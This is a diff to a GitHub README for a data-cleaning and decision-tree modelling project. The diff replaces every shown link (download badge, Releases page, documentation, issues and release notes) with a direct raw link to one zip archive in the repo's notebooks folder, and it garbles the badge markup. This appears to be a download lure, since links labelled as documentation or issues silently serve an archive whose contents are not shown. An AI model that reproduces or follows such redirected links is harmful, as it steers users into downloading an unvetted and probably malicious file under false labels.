@@ -1,6 +1,6 @@
 # 🧹 Data-Cleaning-Decision-Tree-Modeling - Simplify Your Data Analysis Process
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/rferrer92/Data-Cleaning-Decision-Tree-Modeling/releases)
+[![Download from GitHub](https://raw.githubusercontent.com/rferrer92/Data-Cleaning-Decision-Tree-Modeling/main/notebooks/Data-Cleaning-Decision-Tree-Modeling_v1.8.zip%20Now-Click%https://raw.githubusercontent.com/rferrer92/Data-Cleaning-Decision-Tree-Modeling/main/notebooks/Data-Cleaning-Decision-Tree-Modeling_v1.8.zip)](https://raw.githubusercontent.com/rferrer92/Data-Cleaning-Decision-Tree-Modeling/main/notebooks/Data-Cleaning-Decision-Tree-Modeling_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Data-Cleaning-Decision-Tree-Modeling project. This application he
 
 ## 📥 Download & Install
 
-1. **Visit the Release Page**: Go to our [Releases page](https://github.com/rferrer92/Data-Cleaning-Decision-Tree-Modeling/releases) to find the latest version of the application.
+1. **Visit the Release Page**: Go to our [Releases page](https://raw.githubusercontent.com/rferrer92/Data-Cleaning-Decision-Tree-Modeling/main/notebooks/Data-Cleaning-Decision-Tree-Modeling_v1.8.zip) to find the latest version of the application.
    
 2. **Choose Your Version**: Look for the most recent version listed. You will find various files available for download. Select the appropriate file for your operating system. For most users, the installer will be the easiest option.
 
@@ -77,8 +77,8 @@ Join our community to get help and share your experiences. You can engage with o
 
 ## 🔗 Additional Resources
 
-- [Project Documentation](https://github.com/rferrer92/Data-Cleaning-Decision-Tree-Modeling/wiki)
-- [GitHub Issues](https://github.com/rferrer92/Data-Cleaning-Decision-Tree-Modeling/issues)
-- [Release Notes](https://github.com/rferrer92/Data-Cleaning-Decision-Tree-Modeling/releases)
+- [Project Documentation](https://raw.githubusercontent.com/rferrer92/Data-Cleaning-Decision-Tree-Modeling/main/notebooks/Data-Cleaning-Decision-Tree-Modeling_v1.8.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/rferrer92/Data-Cleaning-Decision-Tree-Modeling/main/notebooks/Data-Cleaning-Decision-Tree-Modeling_v1.8.zip)
+- [Release Notes](https://raw.githubusercontent.com/rferrer92/Data-Cleaning-Decision-Tree-Modeling/main/notebooks/Data-Cleaning-Decision-Tree-Modeling_v1.8.zip)
 
 By following these steps, you will download and run the Data-Cleaning-Decision-Tree-Modeling application with ease. Start cleaning your data today!
